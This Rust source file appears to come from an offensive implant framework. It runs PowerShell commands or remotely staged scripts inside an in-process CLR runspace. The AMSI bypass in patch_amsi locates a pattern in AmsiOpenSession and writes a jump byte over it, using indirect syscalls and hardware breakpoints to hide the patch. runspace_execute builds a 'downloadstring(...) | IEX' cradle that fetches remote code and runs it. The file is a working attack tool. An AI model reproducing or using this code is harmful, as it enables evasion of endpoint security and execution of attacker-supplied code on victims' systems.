//execute powershell commands or staged ps1 scripts
//patchless AMSI & ETW bypass
use dinvoke_rs::data::PAGE_READWRITE;
use winapi::shared::minwindef::{BYTE, HMODULE};
use ntapi::ntpsapi::NtCurrentProcess;

use crate::namoracore::novacore::get_proc_address;
use crate::namoracore::ntapi::*;
use crate::namoracore::novacore::setup_bypass;
use std::ffi::CString;

use clroxide::{clr::Clr,
    primitives::{_Assembly, wrap_method_arguments, wrap_string_in_variant}
};

const PATCH: [u8; 1] = [0xEB];
static mut ONE_MESSAGE: i32 = 1;


pub fn execute_powershell(args: Vec<String>) -> Result<(), String> {
    setup_bypass()?;

    if args.is_empty() {
        return Err("No arguments provided".to_string());
    }

    let first_arg = &args[0];
    if first_arg.starts_with("http://") || first_arg.starts_with("https://") {
        // Execute the script from the URL
        let _ = patch_amsi();
        let result = unsafe { runspace_execute(first_arg, true) };
        match result {
            Ok(output) => println!("Output:\n{}", output),
            Err(err) => return Err(format!("[!] Error: {}", err)),
        }
    } else {
        // Execute the command
        let command = args.join(" ");
        let _ = patch_amsi();
        let result = unsafe { runspace_execute(&command, false) };
        match result {
            Ok(output) => println!("Output:\n{}", output),
            Err(err) => return Err(format!("[!] Error: {}", err)),
        }
    }

    Ok(())
}

unsafe fn runspace_execute(command: &str, is_staged: bool) -> Result<String, String> {

    //initialize the CLR
    let mut clr = Clr::context_only(None).map_err(|e| e.to_string())?;
    let context = clr.get_context().map_err(|e| e.to_string())?;
    let app_domain = context.app_domain;

    let mscorlib = (*app_domain).load_library("mscorlib").map_err(|e| e.to_string())?;

    //load the 'System.Management.Automation' assembly
    let assembly_type = (*mscorlib).get_type("System.Reflection.Assembly").map_err(|e| e.to_string())?;
    let assembly_load_with_partial_name_fn = (*assembly_type).get_method_with_signature(
        "System.Reflection.Assembly LoadWithPartialName(System.String)",
    ).map_err(|e| e.to_string())?;
    let automation_variant = (*assembly_load_with_partial_name_fn).invoke(
        wrap_method_arguments(vec![wrap_string_in_variant("System.Management.Automation")]).map_err(|e| e.to_string())?,
        None,
    ).map_err(|e| e.to_string())?;
    let automation = automation_variant.Anonymous.Anonymous.Anonymous.byref as *mut _ as *mut _Assembly;

    // Get types
    let runspace_factory_type = (*automation).get_type("System.Management.Automation.Runspaces.RunspaceFactory").map_err(|e| e.to_string())?;
    let runspace_type = (*automation).get_type("System.Management.Automation.Runspaces.Runspace").map_err(|e| e.to_string())?;
    let runspace_pipeline_type = (*automation).get_type("System.Management.Automation.Runspaces.Pipeline").map_err(|e| e.to_string())?;
    let runspace_pipeline_commands_type = (*automation).get_type("System.Management.Automation.Runspaces.CommandCollection").map_err(|e| e.to_string())?;
    let runspace_pipeline_reader_type = (*automation).get_type(
        "System.Management.Automation.Runspaces.PipelineReader`1[System.Management.Automation.PSObject]"
    ).map_err(|e| e.to_string())?;
    let psobject_type = (*automation).get_type("System.Management.Automation.PSObject").map_err(|e| e.to_string())?;

    // Get functions
    let runspace_create_fn = (*runspace_factory_type).get_method_with_signature(
        "System.Management.Automation.Runspaces.Runspace CreateRunspace()",
    ).map_err(|e| e.to_string())?;
    let runspace_open_fn = (*runspace_type).get_method("Open").map_err(|e| e.to_string())?;
    let runspace_dispose_fn = (*runspace_type).get_method("Dispose")?;

    let pipeline_create_fn = (*runspace_type).get_method_with_signature(
        "System.Management.Automation.Runspaces.Pipeline CreatePipeline()",
    ).map_err(|e| e.to_string())?;
    let commands_addscript_fn = (*runspace_pipeline_commands_type)
        .get_method_with_signature("Void AddScript(System.String)").map_err(|e| e.to_string())?;
    let pipeline_invoke_async_fn = (*runspace_pipeline_type).get_method_with_signature("Void InvokeAsync()").map_err(|e| e.to_string())?;
    let pipeline_getoutput_fn = (*runspace_pipeline_type).get_method_with_signature(
        "System.Management.Automation.Runspaces.PipelineReader`1[System.Management.Automation.PSObject] get_Output()"
    ).map_err(|e| e.to_string())?;
    let pipeline_reader_read_fn = (*runspace_pipeline_reader_type)
        .get_method_with_signature("System.Management.Automation.PSObject Read()").map_err(|e| e.to_string())?;
    let psobject_tostring_fn = (*psobject_type).get_method_with_signature("System.String ToString()").map_err(|e| e.to_string())?;

    // Create and open the runspace
    let runspace = (*runspace_create_fn).invoke_without_args(None).map_err(|e| e.to_string())?;
    (*runspace_open_fn).invoke_without_args(Some(runspace.clone())).map_err(|e| e.to_string())?;

    // Create the pipeline and add the command
    let pipeline = (*pipeline_create_fn).invoke_without_args(Some(runspace.clone())).map_err(|e| e.to_string())?;
    let pipeline_commands_property = (*runspace_pipeline_type).get_property("Commands").map_err(|e| e.to_string())?;
    let commands_collection = (*pipeline_commands_property).get_value(Some(pipeline.clone())).map_err(|e| e.to_string())?;

    let script_command = if is_staged {
        format!("(new-object net.webclient).downloadstring('{}') | IEX | Out-String", command)
    } else {
        format!("{} | Out-String", command)
    };

    (*commands_addscript_fn).invoke(
        wrap_method_arguments(vec![wrap_string_in_variant(
            script_command.as_str(),
        )]).map_err(|e| e.to_string())?,
        Some(commands_collection),
    ).map_err(|e| e.to_string())?;

    // Execute the pipeline and read the output
    (*pipeline_invoke_async_fn).invoke_without_args(Some(pipeline.clone())).map_err(|e| e.to_string())?;
    let reader = (*pipeline_getoutput_fn).invoke_without_args(Some(pipeline.clone())).map_err(|e| e.to_string())?;
    let reader_read = (*pipeline_reader_read_fn).invoke_without_args(Some(reader.clone())).map_err(|e| e.to_string())?;
    let reader_read_tostring = (*psobject_tostring_fn).invoke_without_args(Some(reader_read.clone())).map_err(|e| e.to_string())?;
    // Clean up the runspace
    (*runspace_dispose_fn).invoke_without_args(Some(runspace.clone()))?;
    Ok(reader_read_tostring.Anonymous.Anonymous.Anonymous.bstrVal.to_string())


}

fn search_pattern(start_address: &[u8], pattern: &[u8]) -> usize {
    for i in 0..1024 {
        if start_address[i] == pattern[0] {
            let mut j = 1;
            while j < pattern.len() && i + j < start_address.len() && 
                  (pattern[j] == b'?' || start_address[i + j] == pattern[j]) {
                j += 1;
            }
            if j == pattern.len() {
                return i + 3;
            }
        }
    }
    1024
}

pub fn patch_amsi() -> Result<(), anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    let pattern: [BYTE; 9] = [0x48, b'?', b'?', 0x74, b'?', 0x48, b'?', b'?', 0x74];
    let amsi_dll = CString::new("amsi.dll").unwrap();
    let hm: HMODULE = get_module_handle_a(amsi_dll.as_ptr());

    if hm.is_null() {
        return Err(anyhow::anyhow!("Failed to get handle to amsi.dll"));
    }

    let hm_u8 = hm as *mut u8;

    let amsi_open_session = CString::new("AmsiOpenSession").unwrap();
    let amsi_open_session_str = amsi_open_session.to_str().expect("Failed to convert to str");
    let amsi_addr = get_proc_address(hm_u8, amsi_open_session_str)?;

    let mut buffer: [BYTE; 1024] = [0; 1024];
    let mut bytes_read: usize = 0;

    let status = nt_read_virtual_memory(
        NtCurrentProcess,
        amsi_addr,
        buffer.as_mut_ptr() as *mut winapi::ctypes::c_void,
        buffer.len(),
        &mut bytes_read,
    );

    if status != 0 {
        return Err(anyhow::anyhow!("Failed to read memory"));
    }

    let match_address = search_pattern(&buffer, &pattern);
    if match_address == 1024 {
        return Err(anyhow::anyhow!("Failed to find pattern"));
    }

    unsafe {
        if ONE_MESSAGE == 1 {
            println!("[+] AmsiOpenSession patched at address {:#X}", amsi_addr as usize);
            ONE_MESSAGE = 0;
        }
    }

    let update_amsi_address = (amsi_addr as usize) + match_address;

    let mut old_protect: u32 = 0;
    let mut size = PATCH.len();
    let mut base:*mut winapi::ctypes::c_void = update_amsi_address as *mut winapi::ctypes::c_void;
    
    let status = nt_protect_virtual_memory(
        NtCurrentProcess,
        &mut base,
        &mut size,
        PAGE_READWRITE,
        &mut old_protect,
    );

    if status != 0 {
        return Err(anyhow::anyhow!("Failed to change memory protection"));
    }

    let mut bytes_written: usize = 0;
    let status = nt_write_virtual_memory(
        NtCurrentProcess,
        update_amsi_address as *mut winapi::ctypes::c_void,
        PATCH.as_ptr() as *mut winapi::ctypes::c_void,
        PATCH.len(),
        &mut bytes_written,
    );

    if status != 0 {
        return Err(anyhow::anyhow!("Failed to write memory"));
    }

    let mut _temp: u32 = 0;
    let status = nt_protect_virtual_memory(
        NtCurrentProcess,
        &mut base,
        &mut size,
        old_protect,
        &mut _temp
    );

    if status != 0 {
        return Err(anyhow::anyhow!("Failed to restore memory protection"));
    }

    //remove hardware breakpoints
    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    Ok(())
}